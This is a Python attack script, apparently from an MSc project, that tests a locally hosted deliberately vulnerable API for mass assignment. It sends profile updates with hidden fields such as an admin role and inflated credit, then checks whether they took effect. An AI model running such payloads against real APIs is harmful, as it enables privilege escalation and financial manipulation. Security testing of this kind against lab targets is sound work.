#!/usr/bin/env python3
"""
ATTACK 9: Mass Assignment
OWASP: API6:2023
What: Send extra fields in requests to modify hidden properties
How: Add fields like 'role' or 'isAdmin' to profile update
Why dangerous: Could escalate privileges or modify restricted data
"""
import requests
import json
import datetime
import time

TARGET = "http://localhost:8888"
RESULTS = "/home/xd-strange24/mscproject/experiments"

def run(token):
    print("=" * 55)
    print("ATTACK 9: MASS ASSIGNMENT (API6:2023)")
    print("Modifying Hidden Object Properties")
    print("=" * 55)

    headers = {
        "Authorization": "Bearer " + token,
        "Content-Type": "application/json"
    }

    findings = []

    print("[*] Checking current user profile first...\n")

    # Get current profile
    r = requests.get(
        TARGET + "/identity/api/v2/user/dashboard",
        headers=headers,
        timeout=5
    )

    if r.status_code == 200:
        current = r.json()
        print("[CURRENT PROFILE]")
        for k, v in current.items():
            print("  " + k + ": " + str(v))
        print()

    # Attempt mass assignment attacks
    tests = [
        {
            "name": "Try to change role to admin",
            "endpoint": "/identity/api/v2/user/dashboard",
            "method": "PUT",
            "body": {
                "name": "Akash",
                "role": "ROLE_ADMIN",
                "isAdmin": True,
                "available_credit": 999999
            }
        },
        {
            "name": "Try to inflate credit balance",
            "endpoint": "/identity/api/v2/user/dashboard",
            "method": "PUT",
            "body": {
                "name": "Akash",
                "available_credit": 99999.99,
                "credit": 99999.99
            }
        },
        {
            "name": "Try to change email to admin email",
            "endpoint": "/identity/api/v2/user/dashboard",
            "method": "PUT",
            "body": {
                "name": "Akash",
                "email": "admin@crapi.com",
                "role": "ROLE_ADMIN"
            }
        },
    ]

    for test in tests:
        print("[TEST] " + test["name"])
        url = TARGET + test["endpoint"]
        try:
            if test["method"] == "PUT":
                r = requests.put(url, json=test["body"],
                                headers=headers, timeout=5)
            else:
                r = requests.post(url, json=test["body"],
                                 headers=headers, timeout=5)

            print("[STATUS] " + str(r.status_code))
            print("[RESPONSE] " + r.text[:200])

            if r.status_code in [200, 201]:
                # Check if role changed
                check = requests.get(
                    TARGET + "/identity/api/v2/user/dashboard",
                    headers=headers, timeout=5
                )
                if check.status_code == 200:
                    updated = check.json()
                    if updated.get("role") == "ROLE_ADMIN":
                        print("[!!!] PRIVILEGE ESCALATION SUCCESSFUL!")
                        findings.append({
                            "test": test["name"],
                            "result": "CRITICAL - Admin role assigned"
                        })
                    elif str(updated.get("available_credit")) == "99999.99":
                        print("[!!!] CREDIT MANIPULATION SUCCESSFUL!")
                        findings.append({
                            "test": test["name"],
                            "result": "HIGH - Credit balance manipulated"
                        })
                    else:
                        print("[OK] Properties not changed despite 200 response")
            else:
                print("[OK] Request rejected")

        except Exception as e:
            print("[ERROR] " + str(e))

        time.sleep(0.5)
        print()

    print("[RESULT] " + str(len(findings)) + " mass assignment vulnerabilities found")
    print("[SEVERITY] " + ("CRITICAL" if findings else "LOW"))

    result = {
        "attack": "Mass Assignment",
        "owasp": "API6:2023",
        "timestamp": datetime.datetime.now().isoformat(),
        "findings": findings,
        "severity": "CRITICAL" if findings else "LOW"
    }

    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    path = RESULTS + "/attack9_massassignment_" + ts + ".json"
    with open(path, "w") as f:
        json.dump(result, f, indent=2)
    print("[SAVED] " + path)
    return result

if __name__ == "__main__":
    token = input("Enter Bearer token: ").strip()
    run(token)
